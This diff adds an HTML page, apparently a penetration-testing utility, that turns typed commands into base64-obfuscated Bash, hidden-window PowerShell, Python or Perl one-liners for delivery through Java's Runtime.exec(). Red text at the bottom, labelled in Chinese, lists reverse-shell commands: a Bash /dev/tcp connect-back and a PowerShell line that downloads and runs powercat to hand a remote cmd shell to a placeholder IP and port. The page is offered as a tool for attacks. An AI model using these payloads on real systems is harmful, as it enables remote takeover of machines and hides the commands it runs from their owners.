@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>java.lang.Runtime.exec() Payload</title>
+
+</head><body><h1>java.lang.Runtime.exec() Payload</h1>
+<input type="radio" id="bash" name="option" value="bash" onclick="processInput();" checked=""><label for="bash">Bash</label>
+<input type="radio" id="powershell" name="option" value="powershell" onclick="processInput();"><label for="powershell">PowerShell</label>
+<input type="radio" id="python" name="option" value="python" onclick="processInput();"><label for="python">Python</label>
+<input type="radio" id="perl" name="option" value="perl" onclick="processInput();"><label for="perl">Perl</label><p></p>
+<p><textarea rows="10" style="width: 100%; box-sizing: border-box;" id="input" placeholder="Type input here..."></textarea>
+<textarea rows="5" style="width: 100%; box-sizing: border-box;" id="output" onclick="this.focus(); this.select();" readonly=""></textarea></p>
+<script>
+  var taInput = document.querySelector('textarea#input');
+  var taOutput = document.querySelector('textarea#output');
+
+  function processInput() {
+    var option = document.querySelector('input[name="option"]:checked').value;
+
+    switch (option) {
+      case 'bash':
+        taInput.placeholder = 'Type Bash here...'
+        taOutput.value = 'bash -c {echo,' + btoa(taInput.value) + '}|{base64,-d}|{bash,-i}';
+        break;
+      case 'powershell':
+        taInput.placeholder = 'Type PowerShell here...'
+        poshInput = ''
+        for (var i = 0; i < taInput.value.length; i++) { poshInput += taInput.value[i] + unescape("%00"); }
+        taOutput.value = 'powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc ' + btoa(poshInput);
+        break;
+      case 'python':
+        taInput.placeholder = 'Type Python here...'
+        taOutput.value = "python -c exec('" + btoa(taInput.value) + "'.decode('base64'))";
+        break;
+      case 'perl':
+        taInput.placeholder = 'Type Perl here...'
+        taOutput.value = "perl -MMIME::Base64 -e eval(decode_base64('" + btoa(taInput.value) + "'))";
+        break;
+      default:
+        taOutput.value = ''
+    }
+
+    if (!taInput.value) taOutput.value = '';
+  }
+
+  taInput.addEventListener('input', processInput, false);
+</script>
+
+<b>Bash反弹命令：</b>
+<p style="color:red;">bash -i &gt;&amp; /dev/tcp/IP/端口 0&gt;&amp;1</p>
+<br>
+<b>PowerShell反弹命令：</b>
+<p style="color:red;">powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c IP -p 端口 -e cmd</p>
+<br>
+<br>
+<br>
+</body></html>
